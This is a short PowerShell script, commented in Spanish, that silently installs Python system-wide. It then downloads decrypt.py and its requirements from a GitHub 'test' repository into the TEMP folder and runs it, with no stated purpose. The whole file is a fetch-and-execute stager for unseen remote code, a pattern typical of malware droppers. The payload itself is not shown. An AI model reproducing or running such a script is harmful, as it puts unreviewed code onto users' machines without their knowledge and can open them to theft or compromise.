# Define las URLs para el instalador de Python, decrypt.py y requirements.txt
$pythonInstallerUrl = "https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe"
$decryptPyUrl = "https://raw.githubusercontent.com/PamvInf/test/master/decrypt.py"
$requirementsTxtUrl = "https://raw.githubusercontent.com/PamvInf/test/master/requirements.txt"

# Define las rutas de descarga locales
$pythonInstallerPath = "$env:TEMP\python-installer.exe"
$decryptPyPath = "$env:TEMP\decrypt.py"
$requirementsTxtPath = "$env:TEMP\requirements.txt"

# Descarga el instalador de Python
Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile $pythonInstallerPath

# Instala Python sin GUI
Start-Process -FilePath $pythonInstallerPath -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait

# Descarga decrypt.py y requirements.txt
Invoke-WebRequest -Uri $decryptPyUrl -OutFile $decryptPyPath
Invoke-WebRequest -Uri $requirementsTxtUrl -OutFile $requirementsTxtPath

# Instala las dependencias de Python desde requirements.txt
# Asegúrate de que el comando "pip" esté disponible en el PATH. Si no es así, ajusta la ruta a pip.exe según sea necesario.
pip install -r $requirementsTxtPath

# Ejecuta decrypt.py
python $decryptPyPath

exit
exit